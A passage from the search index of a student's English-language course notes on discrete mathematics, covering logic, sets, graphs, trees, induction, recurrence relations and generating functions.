Applications","text":"<p>Abstract</p> <ul> <li>Time: Spring 2024</li> <li>Teacher\uff1aXing Wei</li> <li>Score\uff1a4.0</li> <li>Textbook\uff1aDiscrete Mathematics and Its Applications, 8th Edition</li> </ul> <p>Info</p> <ul> <li>I have marked some places with \"extra\" to indicate that I will complete them later</li> <li>In order to adapt to teaching and examinations, most of the notes are in English</li> </ul> <p>Other Recommended Notes</p> <ul> <li>Oneko Zone's notes</li> <li>kaleo's notes</li> </ul> <p>If there is any problem with the notes, welcome your criticism and correction!!</p>"},{"location":"dm/1/","title":"Chapter 1 The Foundations: Logic and Proofs","text":""},{"location":"dm/1/#1-logic-and-proofs","title":"1 Logic and Proofs","text":""},{"location":"dm/1/#propositional-logic","title":"Propositional Logic","text":"<ul> <li>proposition</li> <li>atomic/compound proposition</li> <li>propositional variable</li> </ul> <p>Question</p> <p>If \"the statement is false\" is a proposition</p> answer <p>\u00d7. It contradicts.</p>"},{"location":"dm/1/#connectives","title":"Connectives","text":"<ul> <li>negation\uff1a\\(\\neg p\\)</li> <li>conjunction\uff1a\\(p \\land q\\)</li> <li>disjunction, inclusive or\uff1a\\(p \\lor q\\)</li> <li>exclusive or, XOR\uff1a\\(p \\oplus q\\)\u200b</li> <li>implication: \\(p \\rightarrow q\\)</li> <li>biconditional: \\(p \\leftrightarrow q\\)</li> </ul> The two meanings of \"or\" <p>We need to judge the meaning of \"or\" in different contexts</p> <ul> <li>inclusive or : \\(\\lor\\)\u200b</li> <li>exclusive or : \\(\\oplus\\)</li> </ul> <ul> <li>converse\uff1a\\(q \\rightarrow p\\)</li> <li>contrapositive\uff1a\\(\\neg q \\rightarrow \\neg p\\)\u200b</li> <li>inverse\uff1a\\(\\neg p \\rightarrow \\neg q\\)</li> </ul> <p>contrapositive is equivalent to original proposition</p>"},{"location":"dm/1/#truth-table","title":"Truth Table","text":"<p>counting problem</p> <ol> <li>How many rows are there in the truth table with \\(n\\) propositional variable?</li> <li>How many distinct propositions with \\(n\\) propositional variable?</li> </ol> answer <ol> <li>\\(2^n\\)</li> <li>\\(2^{2^n}\\)</li> </ol>"},{"location":"dm/1/#precedence","title":"Precedence","text":""},{"location":"dm/1/#12-applications-of-propositional-logic-13-propositional-equivalences","title":"1.2 Applications of Propositional Logic &amp; 1.3 Propositional Equivalences","text":"<ul> <li>system specification</li> <li>consistent</li> </ul> <ul> <li>tautology: always true</li> <li>contradiction: always false</li> <li>contingency: neither a tautology nor a contradiction</li> </ul>"},{"location":"dm/1/#logic-equivalences","title":"Logic Equivalences","text":"<p>Extra</p> <ul> <li>satisfiable: tautology or contingency</li> <li>unsatisfiable</li> </ul>"},{"location":"dm/1/#propositional-normal-forms","title":"Propositional Normal Forms","text":"<ul> <li>literal: a variable or its negation</li> <li> <p>conjunctive/disjunctive clauses: conjunctions/disjunctions with literals as conjuncts/disjuncts (that is proposition just connected by \\(\\land\\) or \\(\\lor\\) with literals)</p> </li> <li> <p>DNF(disjunctive normal form): disjunction, whose terms(disjuncts) are conjunctions of literals</p> </li> <li>CNF is same as DNF: \\((A_{1, 1} \\vee ... A_{1, n_1}) \\wedge ... \\wedge (A_{k, 1} \\vee ... A_{k, n_k})\\)</li> </ul> <p>Warning</p> <p>\\(\\neg\\) must behind atomic proposition rather than compound proposition</p> <p>How to obtain normal form</p> <ol> <li>eliminate \\(\\rightarrow\\), \\(\\leftrightarrow\\)</li> <li>move \\(\\neg\\) to (by De Morgan's laws and double negation laws), specifically to say, eliminate \\(\\neg\\), \\(\\land\\), \\(\\lor\\) from the scope of \\(\\neg\\) such that any \\(\\neg\\) has only an atom as its scope</li> <li>eliminate \\(\\land\\) from the scope of \\(\\lor\\) or eliminate \\(\\lor\\)# from the scope of \\(\\land\\)(by commutative laws, associative laws and distributive laws)</li> </ol> <ul> <li>full DNF/CNF: a minterm is a conjunctive/disjunctive of literals in which each variable is represented exactly once.</li> </ul> <p>counting problem</p> <p>If a formula has n variables, how many minterms are there?</p> <p>How to obtain full DNF</p> <ul> <li>see the example</li> </ul> Example <p></p> <ul> <li>obtain from truth table</li> </ul>"},{"location":"dm/1/#14-predicates-and-quantifiers","title":"1.4 Predicates and Quantifiers","text":"<ul> <li>(n-ary) predicates</li> <li>variable</li> <li>quantifier</li> <li>universal quantifier \\(\\forall\\): \\(\\forall xP(x) \\equiv P(x_1) \\wedge P(x_2) \\wedge \\dots \\wedge P(x_n)\\)</li> <li>existential quantifier \\(\\exists\\): \\(\\exists xP(x) \\equiv P(x_1) \\vee P(x_2) \\vee \\dots \\vee P(x_n)\\)</li> <li>uniqueness quantifier \\(\\exists!\\): \\(\\exists !P(x) \\equiv \\exists x (P(x) \\wedge \\forall y (P(y) \\rightarrow y = x))\\)\u200b</li> </ul> <p>We use predicates to describe both preconditions and postconditions</p> <p>quantifiers have higher precedence than all logical operators</p> <p>\\(\\forall x P(x) \\lor Q(x) \\equiv (\\forall x P(x)) \\lor Q(x) \\ne \\forall x (P(x) \\lor Q(x))\\)</p> <p>other logical equivalence</p> <ul> <li>\\(\\forall x (A(x) \\wedge B(x)) \\equiv \\forall xA(x) \\wedge \\forall xB(x)\\)</li> <li>\\(\\exists x (A(x) \\vee B(x)) \\equiv \\exists xA(x) \\vee \\exists xB(x)\\)</li> <li>\\(\\forall x (A(x) \\vee B(x)) \\ne \\forall xA(x) \\vee \\forall xB(x)\\)</li> <li>\\(\\exists x (A(x) \\wedge B(x)) \\ne \\exists xA(x) \\wedge \\exists xB(x)\\)</li> </ul> <p>Question</p> <p>If the domain is empty, then below statement is true or false</p> <ul> <li>\\(\\forall x P(x)\\) </li> <li>\\(\\exists x P(x)\\)</li> </ul> answer <ul> <li>true: no element x in the domain for which P(x) is false</li> <li>false: no element x in the domain for which P(x) is true</li> </ul> <ol> <li>a single counterexample is all we need to establish that \"for all x P(x)\" is false</li> <li>specify the domain is mandatory when quantifiers are used    $\\forall x (P(x)\\wedge Q(x)) \\equiv \\forall x P(x) \\wedge \\forall x Q(x) $ $\\exists x (P(x)\\vee Q(x)) \\equiv \\exists x P(x) \\vee \\exists x Q(x) $</li> </ol>"},{"location":"dm/1/#15-nested-quantifiers","title":"1.5 Nested Quantifiers","text":"<p>The order of the quantifiers cannot be changed unless all of them are of the same kind</p>"},{"location":"dm/1/#prenex-normal-formpnf","title":"Prenex Normal Form(PNF)","text":"<p>How to obtain PNF</p> <ol> <li>eliminate \\(\\rightarrow\\), \\(\\leftrightarrow\\)</li> <li>move \\(\\neg\\) (like obtaining DNF)</li> <li>standardize the variables apart (when necessary).</li> <li>move all quantifiers to the front of the formula.</li> </ol> Example <p></p>"},{"location":"dm/1/#16-rules-of-inference","title":"1.6 Rules of Inference","text":"<p>Extra</p>"},{"location":"dm/10/","title":"Chapter 10 Graph","text":""},{"location":"dm/10/#101-graph-and-graph-models","title":"10.1 Graph and Graph Models","text":"<ul> <li>infinite/finite graph</li> <li>multiple edges, multiplicity</li> </ul> Type Edges Multiple Edges Allowed? Loops Allowed? Simple graph Undirected No No Multigraph Undirected Yes No Pseudograph Undirected Yes Yes Simple directed graph Directed No No Directed multigraph Directed Yes Yes Mixed graph Directed and undirected Yes Yes Construct a precedence graph for the following program Extra"},{"location":"dm/10/#102-graph-terminology-and-special-types-of-graphs","title":"10.2 Graph Terminology and Special Types of Graphs","text":"<ul> <li>adjacent(neighbor)</li> <li>adjacent from \\(u\\)(initial vertex) to \\(v\\)(terminal/end vertex)</li> <li>incident(connect)</li> <li>neighborhood \\(N(v)\\): \\(N(A) = \\cup_{v \\in A}N(v)\\)</li> <li>degree: deg(\\(v\\))=0 -&gt; isolated; deg(\\(v\\))=1 -&gt; pendant<ul> <li>undirected graph<ul> <li>The handshaking theorem: \\(2m = \\sum_{v\\in V}deg(v)\\) (m edges)</li> <li>An undirected graph has an even number of vertices of odd degree</li> </ul> </li> <li>directed graph<ul> <li>in-degree: \\(deg^-(v)\\)</li> <li>out-degree: \\(deg^+(v)\\)</li> <li>**\\(\\sum_{v\\in V}deg^-(v) = \\sum_{v\\in V}deg^+(v) = |E|\\)</li> </ul> <p>a loop contributed 1 to both the in-degree and out-degree of the vertex</p> </li> </ul> </li> </ul> <p>Question</p> <p>Proof: G is an nonempty simple graph, then there must exist vertices with same degrees.</p> <ul> <li>underlying undirected graph: ignore directions of edges</li> </ul>"},{"location":"dm/10/#special-simple-graph","title":"Special Simple Graph","text":"<ul> <li>complete graph \\(K_n\\): has \\(\\frac{n(n-1)}{2}\\) edges</li> <li>cycle \\(C_n\\)</li> <li>wheel \\(W_n\\)(n&gt;2): can construct from adding an additional vertex to \\(C_n\\)</li> <li>note \\(W_n\\) has n+1 vertices</li> <li>n-cube/n-dimensional hypercube \\(Q_n\\): two vertices are adjacent if and only if the bit strings that they represent differ in exactly one bit position</li> <li>How to construct \\(Q_{n+1}\\) NOTE: \\(W_3\\) = \\(K_4\\)</li> </ul>"},{"location":"dm/10/#bipartition","title":"Bipartition","text":"<ul> <li>bipartite, bipartition</li> <li>completely bipartite graph \\(K_{m, n}\\): every vertex in \\(V_1\\)(\\(|V_1| = m\\)) is connected to every vertex in \\(V_2\\)(\\(|V_2| = n\\))</li> <li>A simple graph is bipartite if and only if it's possible to assign one of two different colors to each vertex of the graph so that no two adjacent vertices are assigned the same color</li> </ul>"},{"location":"dm/10/#regular","title":"Regular","text":"<ul> <li>regular: if every vertex of this graph has the same degree. -&gt; n-regular</li> </ul> <p>Example</p> <p>\\(K_n\\) is n-1-regular</p>"},{"location":"dm/10/#subgraph","title":"Subgraph","text":"<ul> <li>subgraph, proper subgraph, spanning subgraph</li> <li>subgraph induced(the max subgraph with given vertices)</li> <li>remove or add edges of a graph</li> <li>edge contraction(merge two vertex into one)</li> <li>remove vertices from a graph</li> <li>union of graphs</li> </ul> <p>Example</p> <p>How many subgraphs with at least one vertex does \\(K_n\\) have?  \\(\\sum_{k=1}^{n}C(n, k) \\times 2^{C(k, 2)}\\)</p> <p>\\(W_3: \\sum_{k=1}^{4}C(4, k) \\times 2^{C(k, 2)}\\)</p>"},{"location":"dm/10/#103-representing-graphs-and-graph-isomorphism","title":"10.3 Representing Graphs and Graph Isomorphism","text":"<p>representation:</p> <ul> <li>adjacency matrix</li> <li>NOTE: a loop to itself is 1, not 2</li> <li>adjacency list</li> <li>incidence matrix: row &lt;-&gt; vertex; column &lt;-&gt; edge</li> </ul> graph\\the sum of the entries in a row column adjacency matrix for undirected graph \\(deg(v) - loop(v)\\) \\(deg(v) - loop(v)\\) adjacency matrix for directed graph \\(deg^+(v)\\) \\(deg^-(v)\\) incidence matrix for undirected graph \\(deg(v) - loop(v)\\) judge if it's a loop incidence matrix for undirected graph <p>\\(deg(v) - loop(v)\\) means the number of edges incident to j\\(v\\)</p> <p>isomorphic: one-to-one correspondence of two graphs</p> <ul> <li>find an isomorphism \\(f\\) + write the matrix to show \\(f\\) preserve edges \u627e\u5230\u540c\u6784\u7684\u6620\u5c04+\u5199\u51fa\u76f8\u5e94\u7684\u77e9\u9635\u53bb\u8868\u660e\u8be5\u6620\u5c04\u4e5f\u4fdd\u8bc1\u4e86\u8fb9\u7684\u4e00\u5bf9\u4e00\u5173\u7cfb</li> <li>prove nonisomorphic: use graph invariant</li> <li>the number of vertices</li> <li>the number of edges</li> <li>degree -&gt; degree of adjacent vertex(EXAPMLE10)</li> <li>path</li> <li>bipartite/complete/wheel</li> <li>the length of circuit</li> <li>\u662f\u5426\u53ef\u4ee5\u4e8c\u67d3\u8272</li> <li>etc.</li> </ul> <p>Example</p> <ul> <li>Draw all nonisomorphic undirected simple graph with 4 vertices and 3 edges</li> <li>by handshaking theroem, the sum of degree of vertices is 6, and the maximal degree is 3(since 4 vertices)</li> <li>we can list 3 possible situation: 3111, 2220, 2211   \u8fd9\u91cc\u6709\u4e2a\u4e0d\u8981\u6c42\u7684\u7ed3\u5a5a\u5b9a\u7406\u53ef\u4ee5\u5224\u65ad\u67d0\u4e2a\u5e8f\u5217\u662f\u5426\u662f\u56fe</li> <li>Draw 3 nonisomorphic undirected simple graph with the sequence of degrees 1,1,1,2,2,3 ![[Pasted image 20240606033357.png]]</li> <li>Draw all nonisomorphic spanning subgraphs of \\(K_4\\) ![[Pasted image 20240606033302.png]]</li> <li>prove: isomorphism of simple graphs is equivalence relation</li> </ul>"},{"location":"dm/10/#104-connectivity","title":"10.4 Connectivity","text":"<ul> <li>path/circuit(cycle) -&gt; simple path/circuit: doesn't contain same edge(not same vertex)</li> <li>connected/disconnected There is a simple path between every pair of distinct vertices of a connected undirected graph.  Proof: Because the graph is connected there is a path between u and v. Throw out all redundant circuits to make the path simple.</li> <li>connected components: maximal connected subgraph</li> <li>cut vertex(articulation point)</li> <li>nonseparable graphs: Connected graphs without cut vertices</li> <li>vertex cut(separating set)</li> <li>vertex connectivity \\(\\kappa(G)\\): the minimum number of vertices in a vertex cut<ul> <li>\\(0 \\le \\kappa(G) \\le n-1\\)</li> <li>disconnected graph or single vertex: \\(\\kappa(G) = 0\\)</li> <li>connected graph with cut vertex: \\(\\kappa(G) = 1\\)</li> <li>\\(\\kappa(K_n) = n-1\\)</li> </ul> </li> <li> <p>k-connected(k-vertex-connected): \\(\\kappa(G) \\ge k\\) -&gt; 2-connected=biconnected  NOTE: \\(\\kappa(G) \\ge k\\) rather than \\(\\kappa(G) = k\\)</p> </li> <li> <p>cut edge(bridge)</p> </li> <li>edge cut</li> <li>edge connectivity \\(\\lambda(G)\\)<ul> <li>\\(0 \\le \\lambda(G) \\le n-2\\)</li> <li>connected graph with cut vertex: \\(\\lambda(G) = 1\\)</li> <li>\\(\\lambda(K_n) = n-1\\) \\(\\(\\kappa(G) \\le \\lambda(G) \\le min_{v\\in V}deg(v)\\)\\)</li> </ul> </li> </ul> <p>Example</p> <ol> <li>Every connected graph except a complete graph has a vertex cut.(EX51)</li> </ol>"},{"location":"dm/10/#strongly-connected","title":"Strongly connected","text":"<ul> <li>strongly/weakly connected</li> <li>strongly connected components</li> </ul> <p>Question</p> <ol> <li>How to determine whether a given directed graph is strongly connected or weakly  connected ?</li> <li>How to find the strongly connected components in a directed graph ?</li> </ol> <p>Tip</p> <ol> <li>Some other graph invariants involving path<ul> <li>Two graphs are isomorphic only if they have simple circuits of the same  length.</li> <li>Two graphs are isomorphic only if they contain paths that go through vertices so that the corresponding vertices in the two graphs have the same degree.</li> </ul> </li> <li>We can also use paths to find mapping that are potential isomorphisms.</li> </ol>"},{"location":"dm/10/#path","title":"Path","text":"<p>counting paths between vertices \\(A^r[i][j]\\)(the \\((i, j)\\)-th entry of \\(A^r\\)) represent the number of paths of length \\(r\\) from \\(v_i\\) to \\(v_j\\)</p>"},{"location":"dm/10/#105-euler-and-hamilton-paths","title":"10.5 Euler and Hamilton Paths","text":"<ul> <li>Euler path: a simple path containing every edge of \\(G\\)</li> <li>Euler circuit: a simple circuit containing every edge of \\(G\\)</li> <li>Euler Graph: a graph contains an Euler circuit</li> <li>A connected multigraph with at least two vertices has an Euler circuit if and only if each of its vertices has even degree</li> <li>A connected multigraph has an Euler path but not an Euler circuit if and only if it has exactly two vertices of odd degree</li> <li> <p>A directed multigraph having no isolated vertices has an Euler circuit if and only if</p> <ol> <li>the graph is weakly connected</li> <li>the in-degree and out-degree of each vertex are equal.</li> </ol> </li> <li> <p>A directed multigraph having no isolated vertices has an Euler path but not an Euler circuit if and only if</p> <ol> <li>the graph is weakly connected</li> <li>the in-degree and out-degree of each vertex are equal for all but two vertices, one that has in-degree 1 larger than its outdegree and the other that has out-degree 1 larger than its indegree.</li> </ol> </li> </ul> <p>Pseduocode of constructing Euler Circuits</p> <pre><code>procedure Euler(G: connected multigraph with all vertices of even degree)\ncircuit := a circuit in G beginning at an arbitrarily chosen vertex with edges\n    successively added to form a path that returns to this vertex\nH := G with the edges of this circuit removed\nwhile H has edges\n    subcircuit := a circuit in H beginning at a vertex in H that also is an\n        endpoint of an edge of circuit\n    H := H with edges of subcircuit and all isolated vertices removed\n    circuit := circuit with subcircuit inserted at the appropriate vertex\nreturn circuit {circuit is an Euler circuit}\n</code></pre> <ul> <li>Hamilton path: a simple path in a graph \\(G\\) that passes through every vertex exactly once</li> <li>Hamilton circuit: a simple circuit in a graph G that passes through every vertex exactly once</li> <li>Hamilton graph: a connected graph \\(G\\) has a Hamilton circuit</li> <li>No useful necessary and sufficient conditions for the existence of Hamilton circuit.</li> <li>sufficient condition<ul> <li>DIRAC's theorem: If \\(G\\) is a simple graph with n vertices with \\(n\\ge 3\\) such that the degree of every vertex in \\(G\\) is at least \\(\\frac{n}{2}\\),then \\(G\\) has a Hamilton circuit.</li> <li>ORE's theorem: If \\(G\\) is a simple graph with n vertices with \\(n\\ge 3\\) such that \\(deg(u)+deg(v) \\ge n\\)for every pair of nonadjacent vertices \\(u\\) and v \\(in\\) \\(G\\), then \\(G\\) has a Hamilton circuit.</li> </ul> </li> <li> <p>necessary condition</p> <ul> <li>a graph with a vertex of degree one cannot have a Hamilton circuit.</li> </ul> </li> <li> <p>property</p> <ul> <li>If a vertex in the graph has degree two, then both edges that are incident with this vertex must be part of any Hamilton circuit.</li> <li>When a Hamilton circuit is being constructed and this circuit has passed through a vertex, then all remaining edges incident with this vertex, other than the two used in the circuit , can be removed from consideration</li> </ul> </li> </ul> <p>For any nonempty subset S of set V, the number of connected components in G-S &lt;=|S|.</p>"},{"location":"dm/10/#106-short-path-problems","title":"10.6 Short-Path Problems","text":"<p>Dijkstra Algorithm</p>"},{"location":"dm/10/#107-planar-graphs","title":"10.7 Planar Graphs","text":""},{"location":"dm/10/#108-graph-coloring","title":"10.8 Graph Coloring","text":""},{"location":"dm/11/","title":"Chapter 11 Tree","text":""},{"location":"dm/11/#111-introduction-to-trees","title":"11.1 Introduction to Trees","text":""},{"location":"dm/11/#basic-terminology-properties","title":"Basic Terminology &amp; Properties","text":"<ul> <li>tree</li> <li>forest</li> <li>unrooted/rooted tree</li> <li>parent, child, sibling</li> <li>ancestor, descenstor</li> <li>leaf, internal vertex</li> <li>subtree</li> <li>m-ary tree -&gt; binary tree(m=2)</li> <li>full m-ary tree: every internal vertices have m children</li> <li>ordered rooted tree -&gt; left/right child/subtree -&gt; isomorphic</li> </ul> <ul> <li>level: the length of path from root to the vertex(the level of root = 0)</li> <li>height: maximum level of vertices</li> <li>balanced: all leaves are at levels h or h-1</li> <li>complete: full and every leaf at the same level</li> </ul> <ul> <li>\\(e=n-1\\)</li> <li>Every tree is a bipartite</li> </ul> <p>Counting Problem</p> <p>How many nonisomorphic unrooted/rooted tree are there with n vertices if n = 5?</p> <p>\u53ef\u4ee5\u5f53\u4f5c\u9ad8\u4e2d\u7b97\u78b3\u94fe\u4e2a\u6570\u7684\u9898\u76ee\u505a\uff0c\u627eroot\u5c31\u76f8\u5f53\u4e8e\u627e\u4e0d\u540c</p>"},{"location":"dm/11/#full-m-ary-tree","title":"Full m-ary Tree","text":"<p>A full m-ary tree(\\(n\\) vertices, \\(i\\) internal, \\(l\\) leaves) based on \\(n=mi+1\\) &amp; \\(n = i + l\\)</p> <ul> <li>\\(n\\) =&gt; \\(i = \\frac{n-1}{m}\\) &amp; \\(l = \\frac{(m-1)n+1}{m}\\)</li> <li>\\(i\\) =&gt; \\(n=mi+1\\) &amp; \\(n = (m-1)i + 1\\)</li> <li>\\(l\\) =&gt; \\(n = \\frac{ml-1}{m-1}\\) &amp; \\(i = \\frac{l-1}/{m-1}\\)</li> </ul>"},{"location":"dm/11/#binary-search-tree","title":"Binary Search Tree","text":"<p>see my fds notes</p>"},{"location":"dm/11/#balanced-m-ary-tree","title":"Balanced m-ary Tree","text":"<ul> <li>There are at most \\(m^h\\) leaves in an m-ary tree of height h.</li> <li>If an m-ary tree of height h has l leaves, then \\(h \\ge\\lceil \\log_ml \\rceil\\)</li> <li>If the m-ary tree is full and balanced, then \\(h = \\lceil \\log_ml \\rceil\\)</li> </ul>"},{"location":"dm/11/#112-applications-of-trees","title":"11.2 Applications of Trees","text":""},{"location":"dm/11/#haffman-coding","title":"Haffman Coding","text":"Example"},{"location":"dm/11/#113-tree-traversal","title":"11.3 Tree Traversal","text":"<p>see my fds notes</p>"},{"location":"dm/11/#114-spanning-trees","title":"11.4 Spanning Trees","text":"<p>see my fds notes</p>"},{"location":"dm/11/#115-minimum-spanning-trees","title":"11.5 Minimum Spanning Trees","text":"<p>see my fds notes</p>"},{"location":"dm/2/","title":"Chapter 2 Basic Structure: Sets, Functions, Sequences, Sums, and Matrices","text":""},{"location":"dm/2/#21-sets-22-set-operations","title":"2.1 Sets &amp; 2.2 Set Operations","text":"<ul> <li>Set<ul> <li>unversal set \\(U\\)</li> <li>empty set \\(\\emptyset\\)</li> </ul> </li> <li>subset: \\(A \\subseteq B\\)</li> <li>equality of sets: \\(A = B \\leftrightarrow A \\subseteq B \\land B \\subseteq A\\)</li> <li> <p>proper subset: \\(A \\subset B \\leftrightarrow A \\subseteq B \\land A \\neq B\\)</p> </li> <li> <p>cardinality: \\(|S|\\)</p> </li> <li>Cartesian product: \\(A \\times B\\)</li> <li>finite/infinite</li> </ul>"},{"location":"dm/2/#power-set-ps","title":"power set \\(P(S)\\)","text":"<ul> <li>\\(P(S) = \\{X | X \\subseteq S\\}\\)</li> <li>\\(X \\in P(S) =&gt; X \\subseteq S\\)</li> <li>\\(|P(S)| = 2^n\\)</li> </ul>"},{"location":"dm/2/#set-operation","title":"set operation","text":"<ul> <li>union: \\(A \\cup B\\)</li> <li>intersection: \\(A \\cap B\\)</li> <li>difference: \\(A - B\\)</li> <li>symmetric difference: \\(A \\oplus B = (A \\cup B) - (A \\cap B) = (A - B) \\cup (B - A)\\)</li> <li> <p>complement: \\(\\overline{A} = \\{x \\in U | x \\notin A\\}\\)</p> </li> <li> <p>disjoint: \\(A \\cap B = \\emptyset\\)</p> </li> </ul> <p>set identities</p> <p>the table</p> <p>Question</p> <p>\\(S = \\{\\emptyset\\}\\), and what is \\(P(S), P(P(S))\\)?</p> answer <ul> <li>\\(P(S) = \\{\\emptyset, \\{\\emptyset\\}\\}\\)</li> <li>\\(P(P(S)) = \\{\\emptyset, \\{\\emptyset\\}, \\{\\{\\emptyset\\}\\}, \\{\\emptyset, \\{\\emptyset\\}\\}\\}\\)</li> </ul> <ul> <li>Proving Set Identities<ol> <li>Subset method</li> <li>Membership Tables</li> <li>Apply existing identities</li> </ol> </li> </ul>"},{"location":"dm/2/#23-functions","title":"2.3 Functions","text":"<ul> <li>function</li> <li> <p>domain/codomain/range</p> </li> <li> <p>range \\(\\subseteq\\) codomain</p> </li> <li> <p>image/preimage</p> </li> <li> <p>one-to-one(injective)</p> </li> <li>onto(surjective)</li> <li> <p>one-to-one correspondence(bijection): The two sets must have the same cardinality</p> </li> <li> <p>composition: \\((f \\circ g)(a) = f(g(a))\\)</p> </li> <li>take effect from right to left \\(\\leftarrow\\)</li> </ul>"},{"location":"dm/2/#important-functions","title":"Important Functions","text":"<ul> <li>floor function \\(\\lfloor x \\rfloor\\): \\(\\lfloor x \\rfloor = n\\) if and only if \\(n \\le x \\lt n + 1\\)</li> <li>ceiling function \\(\\lceil x \\rceil\\): \\(\\lceil x \\rceil = n\\) if and only if \\(n - 1 \\lt x \\le n\\)</li> </ul>"},{"location":"dm/2/#25-cardinality-of-sets","title":"2.5 Cardinality of Sets","text":"<p>expansion: cardinality of finite sets -&gt; cardinality of infinite sets</p> sets have the same cardinality \\(A = (a, b), B = (0, 1)\\)\\(A = (0, 1), B = [0, 1]\\) <ul> <li>countable \\(\\aleph_0\\): a set is either finite or has the same cardinality as the set of positive integers</li> <li>uncountable: not countable</li> </ul> <ul> <li>Theorem: If \\(A\\) and \\(B\\) are countable sets, then \\(A \\cup B\\) is also countable</li> <li>SCHRODER-BERNSTEIN THEOREM: If \\(A\\) and \\(B\\) are sets with \\(|A| \\le |B|\\) and \\(|B| \\le |A|\\), then \\(|A| = |B|\\)</li> </ul> countable sets \\(Z\\)\\(S = N \\times N\\)\\(Q^+\\) <p>for \\((x, y) \\in N \\times N\\), let \\(f(x, y) = \\frac{(x+y)(x+y+1)}{2} + y + 1\\)</p> <ul> <li>\\(|Q^+| \\le |S|\\)</li> <li>\\(|S| = |N|\\)</li> <li>\\(N \\subseteq Q^+ =&gt; |N| \\le |Q^+|\\)</li> </ul> <p>so \\(|Q| = |N|\\), Q is countable</p> uncountable sets <p>=== \\(R\\)</p>"},{"location":"dm/3/","title":"Chapter 3 Algorithms","text":"<p>please see fds notes</p>"},{"location":"dm/4/","title":"Chapter 4 Number Theory and Cryptography","text":"<p>\\(a = d q + r\\) dividend = divisor \u00d7 quotient + remainder \\(q = a \\ div \\ d\\) \\(r = a \\ mod \\ d\\)</p>"},{"location":"dm/5/","title":"Chapter 5 Induction and Recursion","text":""},{"location":"dm/5/#mathematical-induction","title":"Mathematical Induction","text":"<ul> <li>BASIS STEP: P(1) is true</li> <li>INDUCTIVE STEP: \\(\\forall P(k),  P(k+1)\\) is true</li> <li>This completes the inductive step. By mathematical induction, ......</li> </ul>"},{"location":"dm/5/#strong-induction","title":"Strong Induction","text":"<ul> <li>BASIS STEP: P(1) is true</li> <li>INDUCTIVE STEP: suppose \\(P(i), 1 \\le i \\le n\\), prove \\(P(k+1)\\) is true</li> <li>This completes the inductive step. By strong induction, ......</li> </ul>"},{"location":"dm/5/#well-ordering-property","title":"Well-ordering Property","text":"<ul> <li>Every nonempty set of nonnegative integers has a least element</li> </ul> <p>Example</p> <p>Extra</p>"},{"location":"dm/6/","title":"Chapter 6 Counting","text":"<p>in preparation...</p>"},{"location":"dm/8/","title":"Chapter 8 Advanced Counting Techniques","text":""},{"location":"dm/8/#81-applications-of-recurrence-relations","title":"8.1 Applications of Recurrence Relations","text":"<p>common questions in the test paper</p> <ul> <li>Q: Find a recurrence relation and give initial conditions for a specific problem, and then solve \\(a_k\\)\uff0c\\(k\\) is generally small</li> <li>A: Computing item by item: \\(a_1 \\rightarrow a_2 \\rightarrow a_3 \\rightarrow \\cdots \\rightarrow a_k\\)</li> </ul> <p>Find a recurrence relation for the number of bits strings of length n that</p> <p>problem lists</p> <ul> <li>contain a pair of consecutive 0s</li> <li>contain three consecutive 0s</li> <li>not contain three consecutive 0s</li> <li>contain the string 01</li> <li>contain exactly two string 01</li> </ul> answer contain a pair of consecutive 0scontain three consecutive 0snot contain three consecutive 0scontain the string 01contain exactly two string 01 <p>\\(a_n = a_{n-1} + a_{n-2} + 2^{n-2} \\ (n \\ge 2)\\)</p> <ul> <li>1+ xxx(bits strings of length n-1 that contain a pair of consecutive 0s)</li> <li>01+ xxx(bits strings of length n-2 that contain a pair of consecutive 0s)</li> <li>00 + xxx(any bits strings of length n-2)</li> </ul> <p>\\(a_n = a_{n-1} + a_{n-2} + a_{n-3} + 2^{n-3} \\ (n \\ge 3)\\)</p> <ul> <li>1+ xxx(bits strings of length n-1 that contain a pair of consecutive 0s)</li> <li>01+ xxx(bits strings of length n-2 that contain a pair of consecutive 0s)</li> <li>001+ xxx(bits strings of length n-3 that contain a pair of consecutive 0s)</li> <li>000 + xxx(any bits strings of length n-3)</li> </ul> <p>\\(a_n = a_{n-1} + a_{n-2} + a_{n-3} \\ (n \\ge 3)\\)</p> <ul> <li>1 + xxx(n-1)</li> <li>01 + xxx(n-2)</li> <li>001 + xxx(n-3)</li> <li>000 not meet the contain</li> </ul> <p>\\(a_n = a_{n-1} + 2^{n-1} - 1 \\ (n \\ge 2)\\) - 1 + xxx(n-1) - 0 +  xxx(any bits strings of length n-1 containing 1)</p> <p>!!! extra it's a difficult problem solving with other knowledge(\u63d2\u677f\u6cd5)</p>"},{"location":"dm/8/#dynamic-programming","title":"Dynamic Programming","text":"<p>schedule lectures</p>"},{"location":"dm/8/#82-solving-linear-recurrence-relations-83-divide-and-conquer-algorithms-and-recurrence-relations","title":"8.2 Solving Linear Recurrence Relations &amp; 8.3 Divide-and-Conquer Algorithms and Recurrence Relations","text":"<p>some basic conceptions</p> <ul> <li>linear</li> <li>homogeneous/nonhomogeneous</li> <li>with constant coefficients</li> <li>recurrence relation</li> <li>degree</li> <li>characteristic equation/root with multiplicity \\(m\\)</li> <li>general form of solution</li> </ul> Fibonacci Sequence \\[f_n = \\frac{1}{\\sqrt{5}} (\\frac{1 + \\sqrt{5}}{2})^n - \\frac{1}{\\sqrt{5}} (\\frac{1 - \\sqrt{5}}{2})^n\\] <p>I've already studied ODE(ordinary differential equations), so I won't take extra notes in this section</p>"},{"location":"dm/8/#84-generating-functions","title":"8.4 Generating Functions","text":"<p>Generating functions are useful for manipulating sequences.</p> <ul> <li>to solve many kinds of counting problems(ex: the problem of combination or permutation with constraints)</li> <li>to solve the recurrence relations</li> <li>to prove combinatorial identities</li> </ul> <p>sequence -&gt; series</p> <p></p> <p></p> <p>Solutions to find the coefficient</p> <ol> <li>use brute force algebra and just multiply everything out</li> <li>view the problem as asking for the solution to a particular combinatorial problem and solve the problem by other means.</li> <li>get a closed form expression for the coefficients, using the generating function theory developed in this section.</li> </ol> <p>Example</p> <p>What is the generating function for \\(\\{a_k\\}\\), where \\(a_k\\) is the number of solutions of \\(x_1\\)+ \\(x_2\\)+ \\(x_3\\)= k when \\(x_1\\),  \\(x_2\\),  and \\(x_3\\) are integers with \\(x_1\\ge2\\),  \\(0\\le x_2\\le3\\),  and \\(2\\le x_3\\le5\\)?</p> <p>generating function is \\((x^2 + x^ 3+ x^4 + \\ldots) ( 1 + x+ x^2 + x^3) (x^2+ x^ 3+ x^4 + x^5) = x^4( 1 + x + x^2)\\)</p> <p>Find the coefficient of \\(x^{10}\\) in the power series of each of these functions.</p> <ol> <li>\\((1+x^{5}+x^{10}+x^{15}+\\cdots)^{3}\\)</li> 